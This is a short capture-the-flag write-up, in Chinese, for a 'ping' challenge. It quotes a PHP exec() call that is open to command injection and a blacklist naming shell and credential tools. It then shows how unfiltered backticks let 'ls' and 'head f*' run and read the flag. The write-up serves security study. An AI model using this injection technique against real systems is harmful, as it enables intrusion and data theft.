ping
===

經過觀察可以看到關鍵的利用點
```php
exec("ping -c 1 \"{$ip}\" 2>&1", $ret);
```

並且有做一些過濾
```php
$blacklist = [
    'flag', 'cat', 'nc', 'sh', 'cp', 'touch', 'mv', 'rm', 'ps', 'top', 'sleep', 'sed',
    'apt', 'yum', 'curl', 'wget', 'perl', 'python', 'zip', 'tar', 'php', 'ruby', 'kill',
    'passwd', 'shadow', 'root',
    'z',
    'dir', 'dd', 'df', 'du', 'free', 'tempfile', 'touch', 'tee', 'sha', 'x64', 'g',
    'xargs', 'PATH',
    '$0', 'proc',
    '/', '&', '|', '>', '<', ';', '"', '\'', '\\', "\n"
];
```

輸入的 input 要小於 15 個字元。

1. 觀察到 `$ip` 並且沒有過濾頓號 `\``，所以可以直接執行系統指令。
2. `ls` 得到 `ping: flag.php`
3. 嘗試讀取 head f*
```
ping: <?php
$flag = 'FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}';: Name or service not known
```